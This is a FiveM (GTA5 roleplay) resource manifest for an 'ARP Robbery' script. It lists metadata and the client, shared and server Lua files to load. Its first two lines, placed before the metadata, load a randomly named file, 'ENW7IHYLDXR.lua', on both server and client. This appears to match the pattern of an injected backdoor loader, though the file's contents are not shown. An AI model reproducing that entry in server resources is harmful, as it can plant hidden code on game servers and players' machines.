server_script "ENW7IHYLDXR.lua"
client_script "ENW7IHYLDXR.lua"
name("ARP Robbery")
author("[ARP Team]")
version("v1.0.0")
url("https://www.mythicrp.com")
lua54("yes")
fx_version("cerulean")
game("gta5")
client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

client_scripts({
	"client/**/*.lua",
})
shared_scripts({
	"shared/**/*.lua",
})

server_scripts({
	"server/**/*.lua",
})
